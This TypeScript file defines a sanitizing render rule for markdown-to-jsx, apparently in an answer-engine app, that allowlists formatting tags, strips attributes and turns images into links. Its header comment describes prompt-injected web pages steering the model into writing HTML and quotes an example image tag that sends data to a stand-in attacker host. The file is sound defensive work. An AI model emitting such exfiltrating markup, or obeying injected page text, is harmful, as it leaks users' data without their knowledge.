import { createElement, Key, ReactNode } from 'react';
import { MarkdownToJSX, RuleType } from 'markdown-to-jsx';

/**
 * Answer text comes from the model, and the model reads untrusted web pages,
 * so a prompt-injected page can make it write HTML. markdown-to-jsx renders
 * raw HTML by default, which would let an answer load
 * `<img src="https://attacker/?d=...">` (data leaves with no click) or embed
 * frames. This render rule keeps the tags Vane emits itself (`<think>`,
 * `<citation>`) and plain formatting, drops every tag that loads a resource
 * or runs code, strips attributes, and turns markdown images into links.
 */

/** Tags rendered by their own override components. */
const OVERRIDE_TAGS = new Set(['think', 'citation']);

/** Formatting tags rendered without attributes (except a safe `href`). */
const FORMATTING_TAGS = new Set([
  'a',
  'abbr',
  'b',
  'blockquote',
  'br',
  'code',
  'dd',
  'del',
  'details',
  'div',
  'dl',
  'dt',
  'em',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'hr',
  'i',
  'ins',
  'kbd',
  'li',
  'mark',
  'ol',
  'p',
  'pre',
  's',
  'small',
  'span',
  'strong',
  'sub',
  'summary',
  'sup',
  'table',
  'tbody',
  'td',
  'tfoot',
  'th',
  'thead',
  'tr',
  'u',
  'ul',
]);

const VOID_TAGS = new Set(['br', 'hr']);

export const safeHref = (href: unknown): string | undefined =>
  typeof href === 'string' && /^(https?:|mailto:)/i.test(href.trim())
    ? href.trim()
    : undefined;

const externalLink = (href: string, label: ReactNode, key?: Key | null) =>
  createElement(
    'a',
    { key, href, target: '_blank', rel: 'noopener noreferrer nofollow' },
    label,
  );

type RenderRule = NonNullable<MarkdownToJSX.Options['renderRule']>;

/**
 * A `renderRule` for markdown-to-jsx. Returns the safe rendering, or calls
 * `next()` for everything that is not HTML or an image.
 */
export const safeMarkdownRenderRule: RenderRule = (
  next,
  node,
  renderChildren,
  state,
) => {
  if (node.type === RuleType.image) {
    const href = safeHref(node.target);
    const label = node.alt || node.target;
    return href ? externalLink(href, label, state.key) : label;
  }

  if (node.type === RuleType.refImage) {
    return node.alt || null;
  }

  if (
    node.type !== RuleType.htmlBlock &&
    node.type !== RuleType.htmlSelfClosing
  ) {
    return next();
  }

  const tag = String(node.tag).toLowerCase();

  if (OVERRIDE_TAGS.has(tag)) return next();

  const children =
    node.type === RuleType.htmlBlock
      ? node.noInnerParse
        ? (node.text ?? null)
        : node.children
          ? renderChildren(node.children, state)
          : null
      : null;

  if (!FORMATTING_TAGS.has(tag)) {
    /* Unsafe or unknown tag (img, iframe, script, style, svg, video, form,
       ...): keep only its text, never the element. Raw text of script/style
       is dropped too. */
    return tag === 'script' ||
      tag === 'style' ||
      node.type !== RuleType.htmlBlock ||
      node.noInnerParse
      ? null
      : children;
  }

  if (VOID_TAGS.has(tag)) return createElement(tag, { key: state.key });

  if (tag === 'a') {
    const href = safeHref((node.attrs as Record<string, unknown>)?.href);
    return href
      ? externalLink(href, children, state.key)
      : createElement('span', { key: state.key }, children);
  }

  return createElement(tag, { key: state.key }, children);
};
